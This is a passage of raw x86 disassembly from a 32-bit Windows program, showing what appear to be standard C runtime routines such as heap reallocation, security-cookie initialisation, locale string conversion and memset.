  4259ac:	mov    DWORD PTR [ebp-0x20],eax
  4259af:	push   edi
  4259b0:	push   eax
  4259b1:	call   0x424d5d
  4259b6:	add    esp,0x18
  4259b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259bc:	jne    0x425a09
  4259be:	cmp    esi,ebx
  4259c0:	jne    0x4259c8
  4259c2:	xor    esi,esi
  4259c4:	inc    esi
  4259c5:	mov    DWORD PTR [ebp+0xc],esi
  4259c8:	add    esi,0xf
  4259cb:	and    esi,0xfffffff0
  4259ce:	mov    DWORD PTR [ebp+0xc],esi
  4259d1:	push   esi
  4259d2:	push   ebx
  4259d3:	push   DWORD PTR ds:0x4653e0
  4259d9:	call   DWORD PTR ds:0x4280e4
  4259df:	mov    DWORD PTR [ebp-0x1c],eax
  4259e2:	cmp    eax,ebx
  4259e4:	je     0x425a09
  4259e6:	mov    eax,DWORD PTR [edi-0x4]
  4259e9:	dec    eax
  4259ea:	mov    DWORD PTR [ebp-0x24],eax
  4259ed:	cmp    eax,esi
  4259ef:	jb     0x4259f3
  4259f1:	mov    eax,esi
  4259f3:	push   eax
  4259f4:	push   edi
  4259f5:	push   DWORD PTR [ebp-0x1c]
  4259f8:	call   0x424690
  4259fd:	push   edi
  4259fe:	push   DWORD PTR [ebp-0x20]
  425a01:	call   0x424d5d
  425a06:	add    esp,0x14
  425a09:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a0d:	call   0x425a61
  425a12:	cmp    DWORD PTR [ebp-0x20],ebx
  425a15:	jne    0x425a39
  425a17:	cmp    esi,ebx
  425a19:	jne    0x425a1e
  425a1b:	xor    esi,esi
  425a1d:	inc    esi
  425a1e:	add    esi,0xf
  425a21:	and    esi,0xfffffff0
  425a24:	mov    DWORD PTR [ebp+0xc],esi
  425a27:	push   esi
  425a28:	push   edi
  425a29:	push   ebx
  425a2a:	push   DWORD PTR ds:0x4653e0
  425a30:	call   DWORD PTR ds:0x4280f0
  425a36:	mov    DWORD PTR [ebp-0x1c],eax
  425a39:	mov    eax,DWORD PTR [ebp-0x1c]
  425a3c:	cmp    eax,ebx
  425a3e:	jne    0x425aa0
  425a40:	cmp    DWORD PTR ds:0x465068,ebx
  425a46:	je     0x425aa0
  425a48:	push   esi
  425a49:	call   0x426232
  425a4e:	pop    ecx
  425a4f:	test   eax,eax
  425a51:	jne    0x42593c
  425a57:	jmp    0x425a9e
  425a59:	xor    ebx,ebx
  425a5b:	mov    esi,DWORD PTR [ebp+0xc]
  425a5e:	mov    edi,DWORD PTR [ebp+0x8]
  425a61:	push   0x4
  425a63:	call   0x423a7b
  425a68:	pop    ecx
  425a69:	ret    
  425a6a:	xor    eax,eax
  425a6c:	cmp    esi,0xffffffe0
  425a6f:	ja     0x425a87
  425a71:	cmp    esi,ebx
  425a73:	jne    0x425a78
  425a75:	xor    esi,esi
  425a77:	inc    esi
  425a78:	push   esi
  425a79:	push   edi
  425a7a:	push   ebx
  425a7b:	push   DWORD PTR ds:0x4653e0
  425a81:	call   DWORD PTR ds:0x4280f0
  425a87:	cmp    eax,ebx
  425a89:	jne    0x425aa0
  425a8b:	cmp    DWORD PTR ds:0x465068,ebx
  425a91:	je     0x425aa0
  425a93:	push   esi
  425a94:	call   0x426232
  425a99:	pop    ecx
  425a9a:	test   eax,eax
  425a9c:	jne    0x425a6a
  425a9e:	xor    eax,eax
  425aa0:	call   0x42398b
  425aa5:	ret    
  425aa6:	push   0x10
  425aa8:	push   0x4287d0
  425aad:	call   0x423950
  425ab2:	cmp    DWORD PTR ds:0x4653e4,0x3
  425ab9:	jne    0x425af5
  425abb:	push   0x4
  425abd:	call   0x423b0f
  425ac2:	pop    ecx
  425ac3:	and    DWORD PTR [ebp-0x4],0x0
  425ac7:	mov    esi,DWORD PTR [ebp+0x8]
  425aca:	push   esi
  425acb:	call   0x424d32
  425ad0:	pop    ecx
  425ad1:	mov    DWORD PTR [ebp-0x1c],eax
  425ad4:	test   eax,eax
  425ad6:	je     0x425ae3
  425ad8:	mov    esi,DWORD PTR [esi-0x4]
  425adb:	sub    esi,0x9
  425ade:	mov    DWORD PTR [ebp-0x20],esi
  425ae1:	jmp    0x425ae6
  425ae3:	mov    esi,DWORD PTR [ebp-0x20]
  425ae6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425aea:	call   0x425b13
  425aef:	cmp    DWORD PTR [ebp-0x1c],0x0
  425af3:	jne    0x425b08
  425af5:	push   DWORD PTR [ebp+0x8]
  425af8:	push   0x0
  425afa:	push   DWORD PTR ds:0x4653e0
  425b00:	call   DWORD PTR ds:0x4280f4
  425b06:	mov    esi,eax
  425b08:	mov    eax,esi
  425b0a:	call   0x42398b
  425b0f:	ret    
  425b10:	mov    esi,DWORD PTR [ebp-0x20]
  425b13:	push   0x4
  425b15:	call   0x423a7b
  425b1a:	pop    ecx
  425b1b:	ret    
  425b1c:	push   ebp
  425b1d:	mov    ebp,esp
  425b1f:	sub    esp,0x10
  425b22:	push   esi
  425b23:	lea    eax,[ebp-0x8]
  425b26:	push   eax
  425b27:	call   DWORD PTR ds:0x428104
  425b2d:	mov    esi,DWORD PTR [ebp-0x4]
  425b30:	xor    esi,DWORD PTR [ebp-0x8]
  425b33:	call   DWORD PTR ds:0x428100
  425b39:	xor    esi,eax
  425b3b:	call   DWORD PTR ds:0x4280ac
  425b41:	xor    esi,eax
  425b43:	call   DWORD PTR ds:0x4280fc
  425b49:	xor    esi,eax
  425b4b:	lea    eax,[ebp-0x10]
  425b4e:	push   eax
  425b4f:	call   DWORD PTR ds:0x4280f8
  425b55:	mov    eax,DWORD PTR [ebp-0xc]
  425b58:	xor    eax,DWORD PTR [ebp-0x10]
  425b5b:	xor    esi,eax
  425b5d:	mov    DWORD PTR ds:0x4646c0,esi
  425b63:	jne    0x425b6f
  425b65:	mov    DWORD PTR ds:0x4646c0,0xbb40e64e
  425b6f:	pop    esi
  425b70:	leave  
  425b71:	ret    
  425b72:	push   0x118
  425b77:	push   0x428980
  425b7c:	call   0x423950
  425b81:	mov    eax,ds:0x4646c0
  425b86:	xor    eax,DWORD PTR [ebp+0x4]
  425b89:	mov    DWORD PTR [ebp-0x1c],eax
  425b8c:	mov    eax,ds:0x465038
  425b91:	xor    ecx,ecx
  425b93:	cmp    eax,ecx
  425b95:	je     0x425bb6
  425b97:	mov    DWORD PTR [ebp-0x4],ecx
  425b9a:	push   DWORD PTR [ebp+0xc]
  425b9d:	push   DWORD PTR [ebp+0x8]
  425ba0:	call   eax
  425ba2:	pop    ecx
  425ba3:	pop    ecx
  425ba4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ba8:	jmp    0x425cb4
  425bad:	xor    eax,eax
  425baf:	inc    eax
  425bb0:	ret    
  425bb1:	mov    esp,DWORD PTR [ebp-0x18]
  425bb4:	jmp    0x425ba4
  425bb6:	mov    eax,DWORD PTR [ebp+0x8]
  425bb9:	dec    eax
  425bba:	je     0x425bcf
  425bbc:	mov    edi,0x42895c
  425bc1:	mov    DWORD PTR [ebp-0x20],0x4288a8
  425bc8:	mov    esi,0xd4
  425bcd:	jmp    0x425be0
  425bcf:	mov    edi,0x428888
  425bd4:	mov    DWORD PTR [ebp-0x20],0x4287e8
  425bdb:	mov    esi,0xb9
  425be0:	mov    BYTE PTR [ebp-0x24],cl
  425be3:	push   0x104
  425be8:	lea    eax,[ebp-0x128]
  425bee:	push   eax
  425bef:	push   ecx
  425bf0:	call   DWORD PTR ds:0x428080
  425bf6:	test   eax,eax
  425bf8:	jne    0x425c0d
  425bfa:	push   0x4284dc
  425bff:	lea    eax,[ebp-0x128]
  425c05:	push   eax
  425c06:	call   0x423d30
  425c0b:	pop    ecx
  425c0c:	pop    ecx
  425c0d:	lea    ebx,[ebp-0x128]
  425c13:	lea    eax,[ebp-0x128]
  425c19:	push   eax
  425c1a:	call   0x423f60
  425c1f:	pop    ecx
  425c20:	add    eax,0xb
  425c23:	cmp    eax,0x3c
  425c26:	jbe    0x425c51
  425c28:	lea    eax,[ebp-0x128]
  425c2e:	push   eax
  425c2f:	call   0x423f60
  425c34:	mov    ebx,eax
  425c36:	lea    eax,[ebp-0x128]
  425c3c:	sub    eax,0x31
  425c3f:	add    ebx,eax
  425c41:	push   0x3
  425c43:	push   0x4284d8
  425c48:	push   ebx
  425c49:	call   0x423e30
  425c4e:	add    esp,0x10
  425c51:	push   ebx
  425c52:	call   0x423f60
  425c57:	pop    ecx
  425c58:	lea    eax,[eax+esi*1+0xc]
  425c5c:	add    eax,0x3
  425c5f:	and    eax,0xfffffffc
  425c62:	call   0x4239a0
  425c67:	mov    DWORD PTR [ebp-0x18],esp
  425c6a:	mov    esi,esp
  425c6c:	push   edi
  425c6d:	push   esi
  425c6e:	call   0x423d30
  425c73:	mov    edi,0x4284b8
  425c78:	push   edi
  425c79:	push   esi
  425c7a:	call   0x423d40
  425c7f:	push   0x4287dc
  425c84:	push   esi
  425c85:	call   0x423d40
  425c8a:	push   ebx
  425c8b:	push   esi
  425c8c:	call   0x423d40
  425c91:	push   edi
  425c92:	push   esi
  425c93:	call   0x423d40
  425c98:	push   DWORD PTR [ebp-0x20]
  425c9b:	push   esi
  425c9c:	call   0x423d40
  425ca1:	push   0x12010
  425ca6:	push   0x428490
  425cab:	push   esi
  425cac:	call   0x423c32
  425cb1:	add    esp,0x3c
  425cb4:	push   0x3
  425cb6:	call   0x422dbc
  425cbb:	int3   
  425cbc:	push   0x38
  425cbe:	push   0x428da0
  425cc3:	call   0x423950
  425cc8:	xor    ebx,ebx
  425cca:	cmp    DWORD PTR ds:0x46505c,ebx
  425cd0:	jne    0x425d0a
  425cd2:	push   ebx
  425cd3:	push   ebx
  425cd4:	xor    esi,esi
  425cd6:	inc    esi
  425cd7:	push   esi
  425cd8:	push   0x428d9c
  425cdd:	push   0x100
  425ce2:	push   ebx
  425ce3:	call   DWORD PTR ds:0x428110
  425ce9:	test   eax,eax
  425ceb:	je     0x425cf5
  425ced:	mov    DWORD PTR ds:0x46505c,esi
  425cf3:	jmp    0x425d0a
  425cf5:	call   DWORD PTR ds:0x428034
  425cfb:	cmp    eax,0x78
  425cfe:	jne    0x425d0a
  425d00:	mov    DWORD PTR ds:0x46505c,0x2
  425d0a:	cmp    DWORD PTR [ebp+0x14],ebx
  425d0d:	jle    0x425d2a
  425d0f:	mov    ecx,DWORD PTR [ebp+0x14]
  425d12:	mov    eax,DWORD PTR [ebp+0x10]
  425d15:	dec    ecx
  425d16:	cmp    BYTE PTR [eax],bl
  425d18:	je     0x425d22
  425d1a:	inc    eax
  425d1b:	cmp    ecx,ebx
  425d1d:	jne    0x425d15
  425d1f:	or     ecx,0xffffffff
  425d22:	or     eax,0xffffffff
  425d25:	sub    eax,ecx
  425d27:	add    DWORD PTR [ebp+0x14],eax
  425d2a:	mov    eax,ds:0x46505c
  425d2f:	cmp    eax,0x2
  425d32:	je     0x425f14
  425d38:	cmp    eax,ebx
  425d3a:	je     0x425f14
  425d40:	cmp    eax,0x1
  425d43:	jne    0x425f47
  425d49:	xor    edi,edi
  425d4b:	mov    DWORD PTR [ebp-0x1c],edi
  425d4e:	mov    DWORD PTR [ebp-0x20],ebx
  425d51:	mov    DWORD PTR [ebp-0x24],ebx
  425d54:	cmp    DWORD PTR [ebp+0x20],ebx
  425d57:	jne    0x425d61
  425d59:	mov    eax,ds:0x465054
  425d5e:	mov    DWORD PTR [ebp+0x20],eax
  425d61:	push   ebx
  425d62:	push   ebx
  425d63:	push   DWORD PTR [ebp+0x14]
  425d66:	push   DWORD PTR [ebp+0x10]
  425d69:	xor    eax,eax
  425d6b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d6e:	setne  al
  425d71:	lea    eax,[eax*8+0x1]
  425d78:	push   eax
  425d79:	push   DWORD PTR [ebp+0x20]
  425d7c:	call   DWORD PTR ds:0x42810c
  425d82:	mov    esi,eax
  425d84:	mov    DWORD PTR [ebp-0x28],esi
  425d87:	cmp    esi,ebx
  425d89:	je     0x425f47
  425d8f:	mov    DWORD PTR [ebp-0x4],0x1
  425d96:	lea    eax,[esi+esi*1]
  425d99:	add    eax,0x3
  425d9c:	and    eax,0xfffffffc
  425d9f:	call   0x4239a0
  425da4:	mov    DWORD PTR [ebp-0x18],esp
  425da7:	mov    eax,esp
  425da9:	mov    DWORD PTR [ebp-0x2c],eax
  425dac:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db0:	jmp    0x425dcd
  425db2:	xor    eax,eax
  425db4:	inc    eax
  425db5:	ret    
  425db6:	mov    esp,DWORD PTR [ebp-0x18]
  425db9:	call   0x426de5
  425dbe:	xor    ebx,ebx
  425dc0:	mov    DWORD PTR [ebp-0x2c],ebx
  425dc3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dc7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dca:	mov    esi,DWORD PTR [ebp-0x28]
  425dcd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dd0:	jne    0x425dee
  425dd2:	lea    eax,[esi+esi*1]
  425dd5:	push   eax
  425dd6:	call   0x424672
  425ddb:	pop    ecx
  425ddc:	mov    DWORD PTR [ebp-0x2c],eax
  425ddf:	cmp    eax,ebx
  425de1:	je     0x425f47
  425de7:	mov    DWORD PTR [ebp-0x20],0x1
  425dee:	push   esi
  425def:	push   DWORD PTR [ebp-0x2c]
  425df2:	push   DWORD PTR [ebp+0x14]
  425df5:	push   DWORD PTR [ebp+0x10]
  425df8:	push   0x1
  425dfa:	push   DWORD PTR [ebp+0x20]
  425dfd:	call   DWORD PTR ds:0x42810c
  425e03:	test   eax,eax
  425e05:	je     0x425ef1
  425e0b:	push   ebx
  425e0c:	push   ebx
  425e0d:	push   esi
  425e0e:	push   DWORD PTR [ebp-0x2c]
  425e11:	push   DWORD PTR [ebp+0xc]
  425e14:	push   DWORD PTR [ebp+0x8]
  425e17:	call   DWORD PTR ds:0x428110
  425e1d:	mov    edi,eax
  425e1f:	mov    DWORD PTR [ebp-0x1c],edi
  425e22:	cmp    edi,ebx
  425e24:	je     0x425ef1
  425e2a:	test   BYTE PTR [ebp+0xd],0x4
  425e2e:	je     0x425e5d
  425e30:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e33:	je     0x425ef1
  425e39:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e3c:	jg     0x425ef1
  425e42:	push   DWORD PTR [ebp+0x1c]
  425e45:	push   DWORD PTR [ebp+0x18]
  425e48:	push   esi
  425e49:	push   DWORD PTR [ebp-0x2c]
  425e4c:	push   DWORD PTR [ebp+0xc]
  425e4f:	push   DWORD PTR [ebp+0x8]
  425e52:	call   DWORD PTR ds:0x428110
  425e58:	jmp    0x425ef1
  425e5d:	mov    DWORD PTR [ebp-0x4],0x2
  425e64:	lea    eax,[edi+edi*1]
  425e67:	add    eax,0x3
  425e6a:	and    eax,0xfffffffc
  425e6d:	call   0x4239a0
  425e72:	mov    DWORD PTR [ebp-0x18],esp
  425e75:	mov    eax,esp
  425e77:	mov    DWORD PTR [ebp-0x30],eax
  425e7a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e7e:	jmp    0x425e9b
  425e80:	xor    eax,eax
  425e82:	inc    eax
  425e83:	ret    
  425e84:	mov    esp,DWORD PTR [ebp-0x18]
  425e87:	call   0x426de5
  425e8c:	xor    ebx,ebx
  425e8e:	mov    DWORD PTR [ebp-0x30],ebx
  425e91:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e95:	mov    edi,DWORD PTR [ebp-0x1c]
  425e98:	mov    esi,DWORD PTR [ebp-0x28]
  425e9b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e9e:	jne    0x425eb8
  425ea0:	lea    eax,[edi+edi*1]
  425ea3:	push   eax
  425ea4:	call   0x424672
  425ea9:	pop    ecx
  425eaa:	mov    DWORD PTR [ebp-0x30],eax
  425ead:	cmp    eax,ebx
  425eaf:	je     0x425ef1
  425eb1:	mov    DWORD PTR [ebp-0x24],0x1
  425eb8:	push   edi
  425eb9:	push   DWORD PTR [ebp-0x30]
  425ebc:	push   esi
  425ebd:	push   DWORD PTR [ebp-0x2c]
  425ec0:	push   DWORD PTR [ebp+0xc]
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	call   DWORD PTR ds:0x428110
  425ecc:	test   eax,eax
  425ece:	je     0x425ef1
  425ed0:	push   ebx
  425ed1:	push   ebx
  425ed2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ed5:	jne    0x425edb
  425ed7:	push   ebx
  425ed8:	push   ebx
  425ed9:	jmp    0x425ee1
  425edb:	push   DWORD PTR [ebp+0x1c]
  425ede:	push   DWORD PTR [ebp+0x18]
  425ee1:	push   edi
  425ee2:	push   DWORD PTR [ebp-0x30]
  425ee5:	push   ebx
  425ee6:	push   DWORD PTR [ebp+0x20]
  425ee9:	call   DWORD PTR ds:0x428090
  425eef:	mov    edi,eax
  425ef1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ef4:	je     0x425eff
  425ef6:	push   DWORD PTR [ebp-0x30]
  425ef9:	call   0x42455a
  425efe:	pop    ecx
  425eff:	cmp    DWORD PTR [ebp-0x20],ebx
  425f02:	je     0x425f0d
  425f04:	push   DWORD PTR [ebp-0x2c]
  425f07:	call   0x42455a
  425f0c:	pop    ecx
  425f0d:	mov    eax,edi
  425f0f:	jmp    0x42606f
  425f14:	mov    DWORD PTR [ebp-0x34],ebx
  425f17:	xor    edi,edi
  425f19:	mov    DWORD PTR [ebp-0x38],ebx
  425f1c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f1f:	jne    0x425f29
  425f21:	mov    eax,ds:0x465044
  425f26:	mov    DWORD PTR [ebp+0x8],eax
  425f29:	cmp    DWORD PTR [ebp+0x20],ebx
  425f2c:	jne    0x425f36
  425f2e:	mov    eax,ds:0x465054
  425f33:	mov    DWORD PTR [ebp+0x20],eax
  425f36:	push   DWORD PTR [ebp+0x8]
  425f39:	call   0x426bcd
  425f3e:	pop    ecx
  425f3f:	mov    DWORD PTR [ebp-0x3c],eax
  425f42:	cmp    eax,0xffffffff
  425f45:	jne    0x425f4e
  425f47:	xor    eax,eax
  425f49:	jmp    0x42606f
  425f4e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f51:	je     0x426045
  425f57:	push   ebx
  425f58:	push   ebx
  425f59:	lea    ecx,[ebp+0x14]
  425f5c:	push   ecx
  425f5d:	push   DWORD PTR [ebp+0x10]
  425f60:	push   eax
  425f61:	push   DWORD PTR [ebp+0x20]
  425f64:	call   0x426c16
  425f69:	add    esp,0x18
  425f6c:	mov    DWORD PTR [ebp-0x34],eax
  425f6f:	cmp    eax,ebx
  425f71:	je     0x425f47
  425f73:	push   ebx
  425f74:	push   ebx
  425f75:	push   DWORD PTR [ebp+0x14]
  425f78:	push   eax
  425f79:	push   DWORD PTR [ebp+0xc]
  425f7c:	push   DWORD PTR [ebp+0x8]
  425f7f:	call   DWORD PTR ds:0x428108
  425f85:	mov    esi,eax
  425f87:	mov    DWORD PTR [ebp-0x40],esi
  425f8a:	cmp    esi,ebx
  425f8c:	je     0x426034
  425f92:	mov    DWORD PTR [ebp-0x4],ebx
  425f95:	add    eax,0x3
  425f98:	and    eax,0xfffffffc
  425f9b:	call   0x4239a0
  425fa0:	mov    DWORD PTR [ebp-0x18],esp
  425fa3:	mov    edi,esp
  425fa5:	mov    DWORD PTR [ebp-0x44],edi
  425fa8:	push   esi
  425fa9:	push   ebx
  425faa:	push   edi
  425fab:	call   0x426250
  425fb0:	add    esp,0xc
  425fb3:	jmp    0x425fc5
  425fb5:	xor    eax,eax
  425fb7:	inc    eax
  425fb8:	ret    
  425fb9:	mov    esp,DWORD PTR [ebp-0x18]
  425fbc:	call   0x426de5
  425fc1:	xor    ebx,ebx
  425fc3:	xor    edi,edi
  425fc5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fc9:	cmp    edi,ebx
  425fcb:	jne    0x425ff0
  425fcd:	push   DWORD PTR [ebp-0x40]
  425fd0:	call   0x424672
  425fd5:	pop    ecx
  425fd6:	mov    edi,eax
  425fd8:	cmp    edi,ebx
  425fda:	je     0x42600d
  425fdc:	push   DWORD PTR [ebp-0x40]
  425fdf:	push   ebx
  425fe0:	push   edi
  425fe1:	call   0x426250
  425fe6:	add    esp,0xc
  425fe9:	mov    DWORD PTR [ebp-0x38],0x1
  425ff0:	push   DWORD PTR [ebp-0x40]
  425ff3:	push   edi
  425ff4:	push   DWORD PTR [ebp+0x14]
  425ff7:	push   DWORD PTR [ebp-0x34]
  425ffa:	push   DWORD PTR [ebp+0xc]
  425ffd:	push   DWORD PTR [ebp+0x8]
  426000:	call   DWORD PTR ds:0x428108
  426006:	mov    DWORD PTR [ebp-0x40],eax
  426009:	cmp    eax,ebx
  42600b:	jne    0x426011
  42600d:	xor    esi,esi
  42600f:	jmp    0x426037
  426011:	push   DWORD PTR [ebp+0x1c]
  426014:	push   DWORD PTR [ebp+0x18]
  426017:	lea    eax,[ebp-0x40]
  42601a:	push   eax
  42601b:	push   edi
  42601c:	push   DWORD PTR [ebp+0x20]
  42601f:	push   DWORD PTR [ebp-0x3c]
  426022:	call   0x426c16
  426027:	add    esp,0x18
  42602a:	mov    esi,eax
  42602c:	neg    esi
  42602e:	sbb    esi,esi
  426030:	neg    esi
  426032:	jmp    0x426037
  426034:	mov    esi,DWORD PTR [ebp-0x48]
  426037:	cmp    DWORD PTR [ebp-0x38],ebx
  42603a:	je     0x42605f
  42603c:	push   edi
  42603d:	call   0x42455a
  426042:	pop    ecx
  426043:	jmp    0x42605f
  426045:	push   DWORD PTR [ebp+0x1c]
  426048:	push   DWORD PTR [ebp+0x18]
  42604b:	push   DWORD PTR [ebp+0x14]
  42604e:	push   DWORD PTR [ebp+0x10]
  426051:	push   DWORD PTR [ebp+0xc]
  426054:	push   DWORD PTR [ebp+0x8]
  426057:	call   DWORD PTR ds:0x428108
  42605d:	mov    esi,eax
  42605f:	cmp    DWORD PTR [ebp-0x34],ebx
  426062:	je     0x42606d
  426064:	push   DWORD PTR [ebp-0x34]
  426067:	call   0x42455a
  42606c:	pop    ecx
  42606d:	mov    eax,esi
  42606f:	lea    esp,[ebp-0x54]
  426072:	call   0x42398b
  426077:	ret    
  426078:	push   0x1c
  42607a:	push   0x428dc8
  42607f:	call   0x423950
  426084:	xor    esi,esi
  426086:	cmp    DWORD PTR ds:0x465060,esi
  42608c:	jne    0x4260c3
  42608e:	lea    eax,[ebp-0x1c]
  426091:	push   eax
  426092:	xor    edi,edi
  426094:	inc    edi
  426095:	push   edi
  426096:	push   0x428d9c
  42609b:	push   edi
  42609c:	call   DWORD PTR ds:0x428118
  4260a2:	test   eax,eax
  4260a4:	je     0x4260ae
  4260a6:	mov    DWORD PTR ds:0x465060,edi
  4260ac:	jmp    0x4260c3
  4260ae:	call   DWORD PTR ds:0x428034
  4260b4:	cmp    eax,0x78
  4260b7:	jne    0x4260c3
  4260b9:	mov    DWORD PTR ds:0x465060,0x2
  4260c3:	mov    eax,ds:0x465060
  4260c8:	cmp    eax,0x2
  4260cb:	je     0x4261bb
  4260d1:	cmp    eax,esi
  4260d3:	je     0x4261bb
  4260d9:	cmp    eax,0x1
  4260dc:	jne    0x4261e1
  4260e2:	mov    DWORD PTR [ebp-0x20],esi
  4260e5:	mov    DWORD PTR [ebp-0x24],esi
  4260e8:	cmp    DWORD PTR [ebp+0x18],esi
  4260eb:	jne    0x4260f5
  4260ed:	mov    eax,ds:0x465054
  4260f2:	mov    DWORD PTR [ebp+0x18],eax
  4260f5:	push   esi
  4260f6:	push   esi
  4260f7:	push   DWORD PTR [ebp+0x10]
  4260fa:	push   DWORD PTR [ebp+0xc]
  4260fd:	xor    eax,eax
  4260ff:	cmp    DWORD PTR [ebp+0x20],esi
  426102:	setne  al
  426105:	lea    eax,[eax*8+0x1]
  42610c:	push   eax
  42610d:	push   DWORD PTR [ebp+0x18]
  426110:	call   DWORD PTR ds:0x42810c
  426116:	mov    edi,eax
  426118:	mov    DWORD PTR [ebp-0x28],edi
  42611b:	test   edi,edi
  42611d:	je     0x4261e1
  426123:	and    DWORD PTR [ebp-0x4],0x0
  426127:	lea    ebx,[edi+edi*1]
  42612a:	mov    eax,ebx
  42612c:	add    eax,0x3
  42612f:	and    eax,0xfffffffc
  426132:	call   0x4239a0
  426137:	mov    DWORD PTR [ebp-0x18],esp
  42613a:	mov    esi,esp
  42613c:	mov    DWORD PTR [ebp-0x2c],esi
  42613f:	push   ebx
  426140:	push   0x0
  426142:	push   esi
  426143:	call   0x426250
  426148:	add    esp,0xc
  42614b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42614f:	jmp    0x426166
  426151:	xor    eax,eax
  426153:	inc    eax
  426154:	ret    
  426155:	mov    esp,DWORD PTR [ebp-0x18]
  426158:	call   0x426de5
  42615d:	xor    esi,esi
  42615f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426163:	mov    edi,DWORD PTR [ebp-0x28]
  426166:	test   esi,esi
  426168:	jne    0x426181
  42616a:	push   edi
  42616b:	push   0x2
  42616d:	call   0x424a68
  426172:	pop    ecx
  426173:	pop    ecx
  426174:	mov    esi,eax
  426176:	test   esi,esi
  426178:	je     0x4261e1
  42617a:	mov    DWORD PTR [ebp-0x24],0x1
  426181:	push   edi
  426182:	push   esi
  426183:	push   DWORD PTR [ebp+0x10]
  426186:	push   DWORD PTR [ebp+0xc]
  426189:	push   0x1
  42618b:	push   DWORD PTR [ebp+0x18]
  42618e:	call   DWORD PTR ds:0x42810c
  426194:	test   eax,eax
  426196:	je     0x4261a9
  426198:	push   DWORD PTR [ebp+0x14]
  42619b:	push   eax
  42619c:	push   esi
  42619d:	push   DWORD PTR [ebp+0x8]
  4261a0:	call   DWORD PTR ds:0x428118
  4261a6:	mov    DWORD PTR [ebp-0x20],eax
  4261a9:	cmp    DWORD PTR [ebp-0x24],0x0
  4261ad:	je     0x4261b6
  4261af:	push   esi
  4261b0:	call   0x42455a
  4261b5:	pop    ecx
  4261b6:	mov    eax,DWORD PTR [ebp-0x20]
  4261b9:	jmp    0x426229
  4261bb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261be:	cmp    ebx,esi
  4261c0:	jne    0x4261c8
  4261c2:	mov    ebx,DWORD PTR ds:0x465044
  4261c8:	mov    edi,DWORD PTR [ebp+0x18]
  4261cb:	test   edi,edi
  4261cd:	jne    0x4261d5
  4261cf:	mov    edi,DWORD PTR ds:0x465054
  4261d5:	push   ebx
  4261d6:	call   0x426bcd
  4261db:	pop    ecx
  4261dc:	cmp    eax,0xffffffff
  4261df:	jne    0x4261e5
  4261e1:	xor    eax,eax
  4261e3:	jmp    0x426229
  4261e5:	cmp    eax,edi
  4261e7:	je     0x426207
  4261e9:	push   0x0
  4261eb:	push   0x0
  4261ed:	lea    ecx,[ebp+0x10]
  4261f0:	push   ecx
  4261f1:	push   DWORD PTR [ebp+0xc]
  4261f4:	push   eax
  4261f5:	push   edi
  4261f6:	call   0x426c16
  4261fb:	add    esp,0x18
  4261fe:	mov    esi,eax
  426200:	test   esi,esi
  426202:	je     0x4261e1
  426204:	mov    DWORD PTR [ebp+0xc],esi
  426207:	push   DWORD PTR [ebp+0x14]
  42620a:	push   DWORD PTR [ebp+0x10]
  42620d:	push   DWORD PTR [ebp+0xc]
  426210:	push   DWORD PTR [ebp+0x8]
  426213:	push   ebx
  426214:	call   DWORD PTR ds:0x428114
  42621a:	mov    edi,eax
  42621c:	test   esi,esi
  42621e:	je     0x426227
  426220:	push   esi
  426221:	call   0x42455a
  426226:	pop    ecx
  426227:	mov    eax,edi
  426229:	lea    esp,[ebp-0x38]
  42622c:	call   0x42398b
  426231:	ret    
  426232:	mov    eax,ds:0x465064
  426237:	test   eax,eax
  426239:	je     0x42624a
  42623b:	push   DWORD PTR [esp+0x4]
  42623f:	call   eax
  426241:	test   eax,eax
  426243:	pop    ecx
  426244:	je     0x42624a
  426246:	xor    eax,eax
  426248:	inc    eax
  426249:	ret    
  42624a:	xor    eax,eax
  42624c:	ret    
  42624d:	int3   
  42624e:	int3   
  42624f:	int3   
  426250:	mov    edx,DWORD PTR [esp+0xc]
  426254:	mov    ecx,DWORD PTR [esp+0x4]
  426258:	test   edx,edx
  42625a:	je     0x4262ab
  42625c:	xor    eax,eax
  42625e:	mov    al,BYTE PTR [esp+0x8]
  426262:	push   edi
  426263:	mov    edi,ecx
  426265:	cmp    edx,0x4
  426268:	jb     0x42629b
  42626a:	neg    ecx
  42626c:	and    ecx,0x3
  42626f:	je     0x42627d
  426271:	sub    edx,ecx
  426273:	mov    BYTE PTR [edi],al
  426275:	add    edi,0x1
  426278:	sub    ecx,0x1
  42627b:	jne    0x426273
  42627d:	mov    ecx,eax
  42627f:	shl    eax,0x8
  426282:	add    eax,ecx
  426284:	mov    ecx,eax
  426286:	shl    eax,0x10
  426289:	add    eax,ecx
  42628b:	mov    ecx,edx
  42628d:	and    edx,0x3
  426290:	shr    ecx,0x2
  426293:	je     0x42629b
  426295:	rep stos DWORD PTR es:[edi],eax
  426297:	test   edx,edx
  426299:	je     0x4262a5
  42629b:	mov    BYTE PTR [edi],al
  42629d:	add    edi,0x1
  4262a0:	sub    edx,0x1
  4262a3:	jne    0x42629b
  4262a5:	mov    eax,DWORD PTR [esp+0x8]
  4262a9:	pop    edi
  4262aa:	ret    
  4262ab:	mov    eax,DWORD PTR [esp+0x4]
  4262af:	ret    
  4262b0:	push   esi
  4262b1:	mov    esi,DWORD PTR [esp+0x8]
  4262b5:	test   esi,esi
  4262b7:	je     0x42643e
  4262bd:	push   DWORD PTR [esi+0x4]
  4262c0:	call   0x42455a
  4262c5:	push   DWORD PTR [esi+0x8]
  4262c8:	call   0x42455a
